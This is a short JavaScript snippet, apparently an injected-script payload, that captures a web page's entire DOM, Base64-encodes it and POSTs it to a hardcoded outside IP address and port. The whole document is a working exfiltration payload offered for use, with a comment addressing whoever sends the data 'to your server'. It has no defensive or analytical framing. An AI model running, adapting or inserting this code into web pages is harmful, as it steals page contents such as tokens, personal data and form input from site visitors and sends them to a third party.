(async () => {
    // Get the entire DOM content as a string
    const domContent = document.documentElement.outerHTML;

    // Encode the DOM content in Base64
    const encodedDOM = btoa(domContent);

    // Send the encoded DOM to your server
    await fetch('http://130.162.225.103:1234', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: encodedDOM }),
    });
})();
